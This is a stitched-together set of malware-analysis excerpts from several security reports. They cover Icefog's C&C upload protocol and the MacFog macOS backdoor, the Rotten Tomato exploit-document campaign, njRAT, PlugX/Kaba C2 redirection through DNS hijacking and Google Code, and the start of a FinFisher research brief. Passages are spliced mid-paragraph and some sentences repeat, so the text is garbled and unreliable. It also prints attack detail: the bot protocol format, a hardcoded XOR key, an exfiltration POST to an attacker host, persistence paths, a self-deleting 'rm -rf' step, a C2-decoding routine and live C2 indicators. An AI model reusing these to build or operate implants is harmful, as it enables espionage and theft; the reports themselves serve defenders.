  <heading>COMMAND UPLOAD</heading>

This command is used to upload a file from the C&C to the bot.The format of this command is the
following:

  [Total Message Size: DWORD]UP[File Size: DWORD][Data Chunk Size+Total
  Message Size field length, a hardcoded value of 0x5000: DWORD][File
  Name]


The server expect an OK message from the bot

  [Total Message Size: DWORD]OK

Then C&C sends the first part of the file.[Total Message Size: DWORD][File data no longer than 0x4ffc]

The server expects the OK message from the bot and transfers the next data chunk until the whole
file is uploaded
</section>


<footer>62</footer>

<header>Appendix C</header>

<section>
  <heading>COMMAND SLEEP</heading>

This command is used to suspend the C&C connection thread for 1 second.[Total Message Size: DWORD]SL

</section>


<footer>63</footer>
                                                                                       
<header>APPENDIX D</header>


<section>

  <heading>►►APPENDIX D</heading>
        <heading>THE MACFOG BOT DESCRIPTION</heading>


The MacOS X malware uses the type “1” protocol, just as the Windows version of Icefog.It has been
distributed on various Internet message boards and forums as an application called “Img2icns”.There are two known malicious bundles, one contains the launcher and the backdoor modules, and
another contains the dropper and the backdoor modules.Once the user executes the malicious application bundle, the backdoor is copied to the user’s
directory and the legitimate application is started as if there was no added malicious code.</section>
<section>

    <heading>MACFOG — LAUNCHER MODULE</heading>
<table>
 Filename:                  launchd
 Location in the bundle: Img2icns.app/Contents/MacOS/launchd
 File size:                 23084 bytes
 Format:                    Mach-O Intel 64-bit executable
 MD5:                       336de9428650c46b64ff699ab4a441bb
</table>
The module is written in Objective C language and contains 4 classes: AppDelegate, UCHostInf,
UCNet, UCUpDownload.The latter three classes seem to be included from the backdoor’s source
code but not used.All functionality is implemented in the function “AppDelegate - (void)
applicationDidFinishLaunching:(id)”.The module was created from the same source code as the dropper but instead of installing the
backdoor module, it only executes the malicious payload and the decoy application:

  “%bundle path%/Contents/Resources/.launchd.app”
  “%bundle path%/Contents/Resources/.Img2icns.app” (the original “Img2icns”
  application, http://www.img2icnsapp.com/).The latter three classes seem to be included from the backdoor’s source
code but not used.All functionality is implemented in the function “AppDelegate - (void)
applicationDidFinishLaunching:(id)”.The module copies its malicious bundle from “Contents/Resources/.launchd.app” to user’s home
directory “/Users/%username%” and launches it, effectively activating the backdoor.Then, it
launches the legitimate part of the bundle, “Contents/Resources/Img2icns.app” that is the original
“Img2icns” application (http://www.img2icnsapp.com/).The “KEYLogger” class appears to be incomplete.It is only able to get information about active
modifier keys and writes data to a log file: “$HOME/Library/log.log”



<footer>65</footer>
                                                                                            
<header>APPENDIX D</header>



When started, the module launches an application: “%application’s bundle path%/Contents/
Resources/.launchd.app” This code seems to be reused from the dropper module.Then, it proceeds with installation.Once the installation is finished, it starts its main thread
(“UCServerThread” function) in an infinite loop.</section>
<section>
    <heading>INSTALLATION</heading>


The module checks if its bundle directory is located in “/Users/%username%/” and if not it copies
the bundle to that directory.It also writes the command “rm -rf %original bundle path%” to the file “/Users/%username%/.launchd.app/config.dat”.This command is then executed by the installed copy of the backdoor, effectively
removing the original bundle directory.Then, it creates a file “$HOME/Library/LaunchAgents/apple.launchd.plist” with all the parameters
required to launch the backdoor every time the system starts.</section>
<section>
  <heading>MAIN THREAD</heading>


The module retrieves host information and host name and uploads this information to the C2 server.All data sent to the C&C server is encrypted with the hardcoded XOR key “*&~^%@0hh8979”.First, it makes a POST request with URL “hxxp://appst0re.net/upload.aspx?filepath=ok&filename=%hostname%.jpg”.After that, it requests commands from the C&C
server.If no data was received, it tries again after sleeping for 120 seconds.One of the most typical cases is the
Tomato Garden case,<fn>1</fn> where several different groups used the same zero-day Microsoft Word
exploit.The term “used” means that they somehow get hold of a document that exploited the
vulnerability, and then left the exploiting document part and the shellcode intact, only changed
the appended encrypted executable at the end, and immediately they had what needed.Something very similar happened just recently, in August and September of 2014.I always wanted to know how the malware writing groups worked.I mean the really serious ones,
the ones behind Chinese state-sponsored APT attacks, or the groups behind high profile common
malware, like Zeus.This case offers another piece of insight.There must have been a staff meeting, where the
manager prompted that, in the next malware distribution campaign they should not only use
the aging CVE-2012-0158 vulnerability, but the newer CVE-2014-1761 as well.The rest of the
document will detail how some of the groups coped with this task.Clearly, the malware authors took a sample somehow and started the implementation process.I wasn’t there, of course, so what follows is an educated guess based on the samples.</section>
<section>
<heading>Template 1: CVE-2012-0158 + CVE-2014-1761 Combo</heading>
Recently we saw a lot of samples that exploit both CVE-2012-0158 and CVE-2014-1761, and
usually either download or drop a Zbot variant.The document starts with the RTF header stuff, followed by the encrypted second stage.This is followed by the embedded object exploiting the CVE-2012-0158 vulnerability with the
shellcode.Following it is a block exploiting the CVE-2014-1761 with a shellcode of its own,
as illustrated in the image below.The color scheme I will use in the rest of the document is the following: green represents
the properly used components; yellow the unused components; and red the incorrectly
used components.<figure>
                                        Encrypted Zbot




                          CVE-2012-0158 exploit and Zbot shellcode




                          CVE-2014-1761 exploit and Zbot shellcode

</figure>

Regardless of the particular exploit used, both shellcodes performed the memory egg-hunting
for the memory markers of the second stage (as described in<fn>2</fn>), and decrypted it when found.The second stage could be either a downloader shellcode or a Win32 executable.One of these samples was SHA1: c3a7cb43ec13299b758cb8ca25eace71329939f7, which
contained an encrypted Zbot variant<fn>3</fn> at the beginning of the RTF.It looks very likely that this
sample was used as a development template for the other malware writing groups.<footer>A SophosLabs technical paper – October 2014                                  2</footer>
<header>The Rotten Tomato Campaign</header>


</section>
<section>
<heading>
First attempt: Plugx</heading>
The first attempt must have come from the group deploying Plugx.They took the above
mentioned sample, and made some modifications to it.The result looks like this one:

<figure>
                                        Encrypted Zbot




                          CVE-2012-0158 exploit and Plugx shellcode




                          CVE-2014-1761 exploit and Zbot shellcode




                                       Encrypted Plugx
</figure>


I can only guess that they didn’t understand the CVE-2014-1761 component, and thought that
there was only one shellcode, in the CVE-2012-0158 segment.So they appended the encrypted
Plugx executable, and replaced the first shellcode with their own.This shellcode contains the
hardcoded offset of the embedded executable, and decrypts from there.However, they left intact the encrypted Zbot executable at the beginning of the file and
the second vulnerability, making this sample a real dual weapon: not only that it exploits
two vulnerabilities, but contains two totally different payloads.However, Word can only be
exploited once: during the exploitation procedure the current instance of Word exits, and a new
one is started that displays the decoy document.So this creates a race condition: whichever
vulnerability is triggered first (or gets lucky in an environment where the other one is patched)
will have the chance to run its own payload.13effaca957cc362bdcbfdd05b5763205b53d9ca
Original name: N/A
</section>
<section>
<heading>
System activity</heading>
<list>
Dropped to C:\Documents and Settings\All Users\DRM\AShld\drmupgds.exe (clean loader
digitally signed by Microsoft) and C:\Documents and Settings\All Users\DRM\AShld\BlackBox.DLL (malware loader) and C:\Documents and Settings\All Users\DRM\AShld\BlackBox.BOX
(payload); registered in HKLM\SYSTEM\CurrentControlSet\Services\BlackBox → ImagePath

The payload is next-generation Plugx,4 plugin function creation dates are 0x20130810.</list>


<footer>A SophosLabs technical paper – October 2014                                  3</footer>
<header>The Rotten Tomato Campaign</header>


<figure></figure>
</section>
<section>
<heading>
C&C servers</heading>
<list>
chromeupdate.authorizeddns.org
Dynamic DNS service

googlesupport.proxydns.com
Dynamic DNS service
</list>
</section>
<section>
<heading>
Template 2: Goldsun</heading>
At some point they must have realized that it was wrong and tried to fix the CVE-2014-1761 part.For that, they took another recent sample, something similar to those that drop Goldsun Trojans
(like this SHA1: e2474cc0da5a79af876771217eb81974e73c39e5)

In this case, the RTF only contains the CVE-2014-1761 vulnerability, with an appended
executable.The vulnerability expects the second stage shellcode at a fixed file offset, checks a
marker string there (“p!11”), and jumps to the second stage, which then decrypts and executes
the final Win32 payload.The first, from Plugx, reads the length of the
embedded decoy document and Win32 payload from the end of the file, and using this info
locates and decrypts the appended payload.This shellcode identifies the host document by
checking if the last dword is the same as the dword before that rotated by 3.And the same
holds for another two dwords before that.These dwords also store the length of the appended
PE payload and decoy document lengths.This structure makes it possible to swap the payload
without changing the exploit and shellcode part.The shellcode from Goldsun executes the second stage code from a fixed offset.<footer>A SophosLabs technical paper – October 2014                                  5</footer>
<header>The Rotten Tomato Campaign</header>



 There are a couple of problems with this implementation.First, the defunctional encrypted
 Zbot remains in these files, with no purpose at all.But the real problem is with the Goldsun
 style CVE-2014-1761 block.It was snatched from the CVE-2014-1761 exploiting document,
 and pasted after the existing Zbot+CVE-2012-0158 combo.Clearly, the offset where the
 second stage code would be shifted with the different prepended content, but it never
 happened.As a result, the CVE-2014-1761 exploitation doesn’t work, despite all the efforts
 of the malware authors.A couple of distinct malware groups were identified that use these schematics.</section>
<section>
<heading>
 Plugx</heading>
 All of these samples are Plugx v2 samples.<fn>4</fn> Most of the time they use Russian related themes in
 the decoy document.<list>
 21b3e540746816c85e5270a1b8bb58bf713ff5f5
 Original name: N/A
</list>
 The dropped decoy document doesn’t contain anything, it is only blank page.Additionally, it has some internal function names not seen in earlier Plugx versions: ZX, ZXWT,
JP1, JP2, JP3, JP4, JP5, JAP0, JAP1

This sample used a Myanmar related decoy theme, likely part of a separate distribution campaign.</section>
<section>
<heading>
C&C servers</heading>
indiasceus.jetos.com	indiasceus.justdied.com
Dynamic DNS service	 Dynamic DNS service



<footer>A SophosLabs technical paper – October 2014                                  9</footer>
<header>The Rotten Tomato Campaign</header>



</section>
<section>
<heading>
Appat</heading>
These are new Trojans.Not connected to Plugx at code level, but the overlap between the C&C
servers, the same domain registration contact (yuminga1@126.com), and the similar Russian
theme indicates that the same group deployed them.0dfd883c1f205f0740d50688683f1869bcc0e9d7
Original name: План космической деятельности на 2021-2025 год.doc

<figure></figure>

</section>
<section>
<heading>
System activity</heading>
Dropped to %WINDOWS%\AppPatch\AcProtect.dll (SHA1:
994be9c340f57ba8cbb20b7ceedad49b00294f3e) and %WINDOWS%\AppPatch\msimain.mui
(separate payload file).Registered for startup with unusual autostart method, briefly touched in.<fn>7</fn>

A Microsoft patch file is dropped to %WINDOWS%\AppPatch\Custom\{099BF1AE-6A93-
493D-0C48-2453E7FBC801}.sdband registered to load in HKLM\SOFTWARE\Microsoft\
Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB.That file loads AcProtect.dll
as a library component.The dumped payload shows similar functionality to what Plugx (or any other general purpose
backdoor) has, but on a code level it is very different.Kamics :712df1f1f11f63e2154eb9023d584be62ef100b8
Original name: N/A

The dropped decoy document is a password protected Word file, content is not visible in the lack
of the correct password.@163.com

</section>
<section>
<heading>
Successful integrations</heading>
But not all were failures.There were two samples that followed the above structure, and the
Goldsun shellcode offset was fixed.However, both samples were only dropping and executing a Chinese nationalized version of calc.exe – these are clearly test samples from China.Furthermore, a couple of common malware samples were found with fixed second stage offsets,
showing that at least these guys know what they are doing.Still, they kept the inactive encrypted
Zbot at the beginning of the document.<figure>
                                        Encrypted Zbot




                         CVE-2012-0158 exploit and Plugx shellcode




                       CVE-2014-1761 exploit and Goldsun shellcode




                    Memory marker and Goldsun second stage shellcode




                                        Encrypted Zbot

</figure>
</section>
<section>
<heading>
Zbot</heading>
Among the samples conventional Zbots variants were also found.These showed up in Middle
Eastern countries, and have Arabic themes as a decoy.The end
of encrypted PE is truncated, and the CVE-2012-0158 code is replaced with the Plugx shellcode.Interestingly, there is another shellcode, which is starts with the same marker (“p!11”) as the
Goldsun second stage code, but the execution logic is the same as the Plugx shellcode.However,
this shellcode just hangs in the air, no execution path leads to it.It is not clear, where these
samples fit in the development path, could be that after the failure to integrate CVE-2014-1761,
the corresponding part was simply ditched from the samples.</section>
<section>
<list>
C&C servers
ruchi.mysq1.net
Dynamic DNS service

19e9dfabdb9b10a90b62c12f205ff0d1eeef3f14
This is not a Plugx sample, but a Nineblog variant.<fn>8</fn>
Original name: ghozaresh amniyati.doc
</list>
<list>
System activity
</list>
Dropped to %PROFILE%\Application Data\Erease.vbe, that connects to the C&C server.The
dropped decoy document is bogus, a truncated copy of the exploited document.<list>
C&C servers:
www.freetimes.dns05.com
Dynamic DNS service

</list>

<footer>A SophosLabs technical paper – October 2014                                  19</footer>
<header>The Rotten Tomato Campaign</header>


</section>
<section>
<heading>
Conclusion</heading>
Apart from the lesson learned about malware development, what can we learn from this process?The partially successful Plugx attempt raises a few questions.Should it be considered as a
common cybercrime sample (as the dropped Zbot suggests) or as an APT (as Plugx does)?Actually, it depends on the patch level of the targeted computer.The narrow line between APT and common malware shrank to zero with that sample.We have seen
earlier6 that authors of common malware are getting the idea of document-based exploitation
from the APT players.Now it is swinging back – targeted attack players are snatching ideas from
the other group.The fact that the attempt was less successful does not deny the fact that a
symbiosis exists between the two distinct criminal groups, and ideas are floating in both directions.Sophos Ltd. All rights reserved.Registered in England and Wales No.2096520, The Pentagon, Abingdon Science Park, Abingdon, OX14 3YP, UK
Sophos is the registered trademark of Sophos Ltd. All other product and company names mentioned are
trademarks or registered trademarks of their respective owners.10.14RG.tpna.simple

</section>
</doc>(http://www.fidelissecurity.com/threatadvisory).To this day, we continue to observe waves of blunt phishing attacks from compromised hosts in
the Middle East, showing threat actors using multiple tools (including njRAT, AdwindRAT, Xtreme
RAT, and H-Worm) in clustered phishing attacks against the same targets.Some of these
attacks continue to target the U.S. telecommunications sector with threat actors sending phishing
emails using business-oriented lures containing the aforementioned tools or links to websites that
serve these tools.Additionally, we continue to directly observe significant activity from threat actors sending
commands to the victim systems in the Middle East.Further, we are observing attackers using the following obfuscators to make detection of this
malware specimen more difficult for security analysts:

     -­‐   .NetShrink (http://www.pelock.com/products/netshrink)
     -­‐   Confuser v1.9.0.0 (http://confuser.codeplex.com/)
     -­‐   .NET Reactor (http://www.eziriz.com/)

This document provides details of the njRAT campaign codes used, versions, ports, and CnC
nodes currently observed sending commands to victim systems.It’s also clear that threat actors
are actively using the following version of njRAT: 0.3.6, 0.4.1a, 0.5.0E, 0.6.4.</section>
<section>
<heading>Threat Overview</heading>
"njRAT" is a robust remote access trojan (RAT) which upon reaching and infecting an end-point,
allows the attacker to have full control over the victim system.Among other things, with this
access, the attacker could start scanning other systems in the victim network to perform lateral
movement.</section>

<footnote>
Users are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use.This
document cannot be modified or converted to any other electronic or machine-readable form in whole or in part without prior written
approval of General Dynamics Fidelis Cybersecurity Solutions, Inc.While we have done our best to ensure that the material found in this document is accurate, General Dynamics Fidelis Cybersecurity
Solutions, Inc. makes no guarantee that the information contained herein is error free.</footnote>
<footer>
Copyright © 2013 General Dynamics Fidelis Cybersecurity Solutions                                                        Rev.We’re publishing these indicators so that others in the
security research community can monitor for this activity and potentially correlate against other
campaigns and tools that are being investigated.<footer>
Copyright © 2013 General Dynamics Fidelis Cybersecurity Solutions                         Rev.The Fidelis Threat Research
Team will continue to actively monitor the ever-evolving threat landscape for the latest threats to
our customers’ security.</section>


<footer>
Copyright © 2013 General Dynamics Fidelis Cybersecurity Solutions                      Rev.2013-12-02
Threat Advisory #1010                             Page 6 of 6          “njRAT”, The Saga Continues
</footer>

</doc><doc>
<section>
<heading>
Operation Poisoned Hurricane</heading>
Introduction

Our worldwide sensor network provides researchers at FireEye Labs with unique opportunities to detect
innovative tactics employed by malicious actors and protects our clients from these tactics.We recently
uncovered a coordinated campaign targeting Internet infrastructure providers, a media organization, a
financial services company, and an Asian government organization.The actor responsible for this
campaign utilized legitimate digital certificates to sign their tools and employed innovative techniques to
cloak their command and control traffic.</section>
<section>
Hurricane Electric Redirection

In March of 2014, we detected Kaba (aka PlugX or SOGU) callback traffic to legitimate domains and IP
addresses.Our initial conclusion was that this traffic was the result of malicious actors
‘sleeping’ their implants, by pointing their command and control domains at legitimate IP
addresses.As this is a popular technique, we did not think much of this traffic at the time.Further analysis revealed that the HTTP headers of the traffic in question contained a Host: entry for
legitimate domains.As we have previously observed malware families that forge their HTTP headers to
include legitimate domains in callback traffic, we concluded that the malware in this case was configured
in the same way.An example of the observed traffic is as follows:

POST /C542BB084F927229348B2A34 HTTP/1.1
Accept: */*
CG100: 0
CG103: 0
CG107: 61456
CG108: 1
User-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; SLCC2; .NET CLR
2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0;
.NET4.0C)
Host: www.adobe.com
Content-Length: 0
Cache-Control: no-cache

As we continued to see this odd traffic throughout the summer we began a search for malware samples
responsible for this behavior.Via this research, we found a malware sample that we believe was
responsible for at least some of the strange traffic that we had observed.This
certificate has a serial number of ‘06 55 69 a3 e2 61 40 91 28 a4 0a ff a9 0d 6d 10’.Analysis of this Kaba sample revealed that it was configured to directly connect to both www.adobe.com
and update.adobe.com.Obviously, this configuration does not make a lot of sense, as the actor would not
be able to control their implants from anywhere on the Internet since they did not have direct control over
these domains – unless the attackers were able to re-route traffic destined for these domains
from specific victims.Indeed, further analysis of this Kaba variant revealed that it was also configured
to use specific DNS resolvers.This sample was configured to resolve DNS lookups via Hurricane
Electric’s nameservers of 216.218.130.2, 216.218.131.2, 216.218.132.2 and 216.66.1.2.We found this interesting, so we investigated how these Hurricane Electric’s nameservers were
configured.Subsequently, we found that anyone could register for a free account with
Hurricane Electric’s hosted DNS service.Via this service, anyone with an account was able to
register a zone and create A records for the registered zone and point those A records to any IP address
they so desired.The dangerous aspect of this service is that anyone was able to hijack
legitimate domains such as adobe.com.Although these nameservers are not recursors and
were not designed to be queried directly by end users, they were returning results if
queried directly for domains that were configured via Hurricane Electrics public DNS
service.Furthermore, Hurricane Electric did not check if zones created by their users were
already been registered or are otherwise legitimately owned by other parties.As we continued this research, we identified 21 legitimate fully qualified domain names that had been
hijacked via this technique by at least one APT actor.In addition to the adobe.com domain mentioned
above, another one of the poisoned domains is www.outlook.com.A lookup of this domain via Google’s
DNS resolvers returns expected results:
<list>
$ dig +short @8.8.8.8 www.outlook.com
www.outlook.com.glbdns2.microsoft.com.www-nameast.outlook.com.<table>
IP Address       Domain             First Seen      Last Seen
59.125.42.167    ml65556.gicp[.]net 2014-06-23      2014-07-23
59.125.42.167    wf.edsplan[.]com 2014-05-12        2014-05-14
59.125.42.167    gl.edsplan[.]com 2014-05-12        2014-05-14
59.125.42.167    unix.edsplan[.]com 2014-05-12      2014-05-14
</table>
Additional researched uncovered more Kaba samples that were configured to leverage Hurricane Electric’s
public DNS resolvers.This certificate
has a serial number of ‘03 e5 a0 10 b0 5c 92 87 f8 23 c2 58 5f 54 7b 80’.This sample used Hurricane Electric’s public DNS resolvers to route traffic to the hijacked domains of
www.adobe.com and update.adobe.com.We also noted that this sample was configured to connect directly
to 59.125.42.168 – one IP address away from the IP that received traffic from the hijacked
www.outlook.com domain.Passive DNS research revealed that this IP hosted the same set of known APT domains listed above:
<table>
IP Address       Domain            First Seen       Last Seen
59.125.42.168     ml65556.gicp[.]net 2014-04-23      2014-07-24
59.125.42.168     wf.edsplan[.]com 2014-04-23        2014-05-14
59.125.42.168     gl.edsplan[.]com 2014-05-04        2014-05-14
59.125.42.168     unix.edsplan[.]com 2014-05-04      2014-05-14
</table>
While this problem does not directly impact users of www.adobe.com, www.outlook.com, or users of the
other affected domains, it should not be dismissed as inconsequential.Actors that adopt this tactic
and obfuscate the destination of their traffic through localized DNS hijacks can
significantly complicate the job of network defenders.Via our sensor network, we observed the actor responsible for this activity conducting a focused campaign.We observed this actor target:
<list>
      Multiple Internet Infrastructure Service Providers in Asia and the United States
      A Media Organization based in the United States
      A financial institution based in Asia
      An Asian government organization
      </list>
</section>
<section>
Google Code Command and Control

Furthermore, we also discovered this same actor conducting a parallel campaign that leveraged Google
Code for command and control.On August 1, 2014 we observed a malicious self-extracting executable (aka
sfxrar) file downloaded from 211.125.81.203.This file had the following properties:
<list>
MD5: 17bc9d2a640da75db6cbb66e5898feb1
Size: 282800 bytes
</list>
A valid certificate from ‘QTI INTERNATIONAL INC’ was used to sign this sfxrar.This certificate had a
serial number of ‘2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9’.The sfxrar contained
the following files:
<table>
File                   Size                   MD5
msi.dll                11680                  029c8f56dd89ceeaf928c3148d13eba7
msi.dll.dat            115218                 62834d2c967003ba5284663b61ac85b5
setup.exe              34424                  d00b3169f45e74bb22a1cd684341b14a
</table>
Setup.exe is a legitimate executable from Kaspersky used to load the Kaba (aka PlugX) files – msi.dll and
msi.dll.dat.These Kaba files are configured to connect to Google Code – specifically code.google.com/p/udom/.On
August 1, this Google Code project contained the encoded command
“DZKSGAAALLBACDCDCDOCBDCDCDOCCDADIDOCBDADDZJS”.[2]
<figure></figure>
These Kaba files are configured to connect to Google Code – specifically code.google.com/p/udom/.On
August 1, this Google Code project contained the encoded command
“DZKSGAAALLBACDCDCDOCBDCDCDOCCDADIDOCBDADDZJS”.<list>
def NewPlugx_C2_redir_decode(s):

rvalue = “”
for x in range(0, len(s), 2):
tmp0 = (ord(s[x+1]) – 0×41) << 4

rvalue += chr(ord(s[x]) + tmp0 – 0×41) return rvalue
</list>
The command ‘DZKSGAAALLBACDCDCDOCBDCDCDOCCDADIDOCBDADDZJS’ decodes to
222.122.208.10.In a live environment, the Kaba implant would then connect to this IP
address via UDP.Further analysis of project at code.google.com/p/udom/ revealed the project owner, 0x916ftb691u,
created a number of other projects.Passive DNS analysis of these IP addresses revealed connections to the following known malicious
infrastructure:
<table>
IP Address        Domain               First Seen    Last Seen
27.122.13.204     bq.cppcp[.]com       2014-03-21    2014-05-08
112.175.143.16    uj.verisignss[.]com  2013-06-30    2013-08-13
112.175.143.16    www.verifyss[.]com 2013-06-30      2013-07-22
112.175.143.16    uj.byonds[.]com      2013-06-24    2013-07-22
112.175.143.16    uj.verifyss[.]com    2013-06-30    2013-07-22
59.125.42.168     ml65556.gicp[.]net   2014-04-23    2014-07-24
59.125.42.168     wf.edsplan[.]com     2014-04-23    2014-05-14
59.125.42.168     gl.edsplan[.]com     2014-05-04    2014-05-14
59.125.42.168     unix.edsplan[.]com   2014-05-04    2014-05-14
59.125.42.167     ml65556.gicp[.]net   2014-06-23    2014-07-23
59.125.42.167     wf.edsplan[.]com     2014-05-12    2014-05-14
59.125.42.167     gl.edsplan[.]com     2014-05-12    2014-05-14
59.125.42.167     unix.edsplan[.]com   2014-05-12    2014-05-14
61.78.32.148      door.nexoncorp[.]com 2014-04-30    2014-06-22
61.78.32.148      verisignss[.]com     2014-04-30    2014-06-22
61.78.32.148      th.nexoncorp[.]com 2014-04-30      2014-06-22
61.78.32.148      tw.verisignss[.]com 2014-04-30     2014-06-22
61.78.32.148      sd.nexoncorp[.]com 2014-04-30      2014-06-22
61.78.32.148      mail.nexoncorp[.]com 2014-04-30    2014-06-22
112.175.143.22    door.nexoncorp[.]com 2014-04-01    2014-04-30
112.175.143.22    th.nexoncorp[.]com 2014-04-01      2014-04-30
112.175.143.22    sd.nexoncorp[.]com 2014-04-01      2014-04-30
112.175.143.22    mail.nexoncorp[.]com 2014-04-01    2014-04-30
112.175.143.22    verisignss[.]com     2013-12-29    2014-04-30
112.175.143.22    tw.verisignss[.]com 2013-12-29     2014-04-30
</table>
</section>
<section>
Relationships Between Campaigns
As mentioned above the Kaba variant eae0391e92a913e757ac78b14a6f079f shared a common import hash
of f749528b1db6fe5aee61970813c7bc18 with many of the samples listed in this post.This samples was to
use Hurricane Electric’s nameservers as well as connect directly to the IP address 59.125.42.168.Note that we identified the same C2 IP 59.125.42.168 via our analysis of the malicious Google Code
projects.Specifically, the Google Project at code.google.com/p/tempzz/, which is linked to the project at
code.google.com/p/udom/, issued an encoded command that decoded to 59.125.42.168.We also identified another related Kaba variant that connected to code.google.com/p/updata-server.In addition to sharing the same Import hash of f749528b1db6fe5aee61970813c7bc18 seen in other
samples listed throughout this post, 50af349c69ae4dec74bc41c581b82459 contained a RT_VERSION
resource of 9dd9b7c184069135c23560f8fbaa829adc7af6d2047cf5742b5a1e7c5c923cb9.This same
RT_VERSION was used in a number of other related samples including:
<table>
MD5                                     C2                                     Uses
                                                                               Hurricane
                                                                               Electric
7e6c8992026a79c080f88103f6a69d2c h.cppcp[.]comu.cppcp[.]com                    NO
52d2d1ab9b84303a585fb81e927b9e01 www.adobe[.]comupdate.adobe[.]com             YES
787c6cf3cb18feeabe4227ec6b19db01 ns.lovechapelumc[.]orgns1.lovechapelumc[.]org NO
</table>
<figure></figure>
</section>
<section>
Conclusion

These coordinated campaigns demonstrate that APT actors are determined to continue operations.As
computer network defenders increase their capabilities to identify and block these campaigns by
deploying more advanced detection technologies, threat actors will continue to adopt creative evasion
techniques.We observed the following evasion techniques in these campaigns:
<list>
              The use of legitimate digital certificates to sign malware
              The use of Hurricane Electrics public DNS resolvers to redirect command and control traffic
              The use of Google Code to obfuscate the location of command and control servers
</list>
While none of these techniques are necessarily new, in combination, they are certainly
both creative and have been observed to be effective.Although the resultant C2 traffic can be
successfully detected and tracked, the fact that the malware appears to beacon to legitimate
domains may lull defenders into a false sense of security.Network defenders should continue to
study the evolution of advanced threat actors, as these adversaries will continue to evolve in pursuit of
their designated objectives.[2] This same encoding algorithm was previously described by Cassidian at
http://blog.cassidiancybersecurity.com/post/2014/01/plugx-some-uncovered-points.html
</footnote>
This entry was posted in Targeted Attack, Threat Research and tagged advanced attack, APT, evasion
techniques, kana, plugx by Ned Moran, Joshua Homan and Mike Scott.Bookmark the permalink.</section>
</doc><doc>
<cover>
Research Brief
The Citizen Lab                                                                      
Number 15 – March 2013

You Only Click Twice:
FinFisher’s Global Proliferation

Morgan Marquis-Boire, Bill Marczak, Claudio Guarnieri, and John Scott-Railton.</cover>

<section>
This post describes the results of a comprehensive global Internet scan for the command and control servers of FinFisher’s surveillance software.It also details the discovery of a campaign using FinFisher in Ethiopia used to target individuals linked to an opposition group.Additionally, it provides examination of a FinSpy Mobile sample found in the wild, which appears to have been used in Vietnam.</section>

<section>
<heading>1.SUMMARY OF KEY FINDINGS</heading>
- We have found command and control servers for FinSpy backdoors, part of Gamma International’s FinFisher “remote monitoring solution,” in a total of 25 countries: Australia, Bahrain, Bangladesh, Brunei, Canada, Czech Republic, Estonia, Ethiopia, Germany, India, Indonesia, Japan, Latvia, Malaysia, Mexico, Mongolia, Netherlands, Qatar, Serbia, Singapore, Turkmenistan, United Arab Emirates, United Kingdom, United States, Vietnam.- A FinSpy campaign in Ethiopia uses pictures of Ginbot 7, an Ethiopian opposition group, as bait to infect users.This continues the theme of FinSpy deployments with strong indications of politically-motivated targeting.- There is strong evidence of a Vietnamese FinSpy Mobile Campaign.We found an Android FinSpy Mobile sample in the wild with a command & control server in Vietnam that also exfiltrates text messages to a local phone number.- These findings call into question claims by Gamma International that previously reported servers were not part of their product line, and that previously discovered copies of their software were either stolen or demo copies.</section>

<section>
<heading>2.BACKGROUND AND INTRODUCTION</heading>

FinFisher is a line of remote intrusion and surveillance software developed by Munich-based Gamma International GmbH.FinFisher products are marketed and sold exclusively to law enforcement and intelligence agencies by the UK-based Gamma Group.<fn>1</fn> Although touted as a “lawful interception” suite for monitoring criminals, FinFisher has gained notoriety because it has been used in targeted attacks against human rights campaigners and opposition activists in countries with questionable human rights records.<fn>2</fn>

In late July 2012, we published the results of an investigation into a suspicious e-mail campaign targeting Bahraini activists.<fn>3</fn> We analyzed the attachments and discovered that they contained the FinSpy spyware, FinFisher’s remote monitoring product.FinSpy captures information from an infected computer, such as passwords and Skype calls, and sends the information to a FinSpy command & control (C2) server.The attachments we analyzed sent data to a command & control server inside Bahrain.This discovery motivated researchers to search for other command & control servers to understand how widely FinFisher might be used.Claudio Guarnieri at Rapid7 (one of the authors of this report) was the first to search for these servers.He fingerprinted the Bahrain server and looked at historical Internet scanning data to identify other servers around the world that responded to the same fingerprint.Rapid7 published this list of servers, and described their fingerprinting technique.Other groups, including CrowdStrike and SpiderLabs also analyzed and published reports on FinSpy.Immediately after publication, the servers were apparently updated to evade detection by the Rapid7 fingerprint.We devised a different fingerprinting technique and scanned portions of the internet.We confirmed Rapid7’s results, and also found several new servers, including one inside Turkmenistan’s Ministry of Communications.We published our list of servers in late August 2012, in addition to an analysis of mobile phone versions of FinSpy.FinSpy servers were apparently updated again in October 2012 to disable this newer fingerprinting technique, although it was never publicly described.Nevertheless, via analysis of existing samples and observation of command & control servers, we managed to enumerate yet more fingerprinting methods and continue our survey of the internet for this surveillance software.We describe the results in this post.Civil society groups have found cause for concern in these findings, as they indicate the use of FinFisher products by countries like Turkmenistan and Bahrain with problematic records on human rights, transparency, and rule of law.In an August 2012 response to a letter from UK-based NGO Privacy International, the UK Government revealed that at some unspecified time in the past, it had examined a version of FinSpy, and communicated to Gamma that a license would be required to export that version outside of the EU.Gamma has repeatedly denied links to spyware and servers uncovered by our research, claiming that the servers detected by our scans are “not … from the FinFisher product line.”<fn>4</fn> Gamma also claims that the spyware sent to activists in Bahrain was an “old” demonstration version of FinSpy, stolen during a product presentation.In February 2013, Privacy International, the European Centre for Constitutional and Human Rights (ECCHR), the Bahrain Center for Human Rights, Bahrain Watch, and Reporters Without Borders filed a complaint with the Organization for Economic Cooperation and Development (OECD), requesting that this body investigate whether Gamma violated OECD Guidelines for Multinational Enterprises by exporting FinSpy to Bahrain.The complaint called previous Gamma statements into question, noting that at least two different versions (4.00 and 4.01) of FinSpy were found in Bahrain, and that Bahrain’s server was a FinFisher product and was likely receiving updates from Gamma.According to recent reporting, German Federal Police appear to have plans to purchase and use the FinFisher suite of tools domestically within Germany.<fn>5</fn> Meanwhile, findings by our group and others continue to illustrate the global proliferation of FinFisher’s products.Research continues to uncover troubling cases of FinSpy in countries with dismal human rights track records, and politically repressive regimes.Most recently, work by Bahrain Watch has confirmed the presence of a Bahraini FinFisher campaign, and further contradicted Gamma’s public statements.This post adds to the list by providing an updated list of FinSpy Command & Control servers, and describing the FinSpy malware samples in the wild which appear to have been used to target victims in Ethiopia and Vietnam.We present these updated findings in the hopes that we will further encourage civil society groups and competent investigative bodies to continue their scrutiny of Gamma’s activities, relevant export control issues, and the issue of the global and unregulated proliferation of surveillance malware.</section>

<section>
<heading>FINFISHER: UPDATED GLOBAL SCAN</heading>

